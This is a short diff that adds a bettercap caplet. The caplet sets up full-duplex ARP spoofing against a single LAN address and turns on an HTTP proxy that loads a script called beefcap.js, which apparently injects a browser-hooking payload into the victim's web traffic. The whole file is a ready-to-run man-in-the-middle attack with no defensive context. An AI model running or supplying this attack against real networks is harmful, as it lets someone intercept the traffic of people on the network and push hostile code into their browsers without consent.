@@ -1,0 +1,8 @@
+set arp.spoof.fulldublex true
+#change target ip
+set arp.spoof.targets 192.168.155.108
+#if change js name dont forget change here
+set http.proxy.script beefcap.js
+http.proxy on
+sleep 1
+arp.spoof on
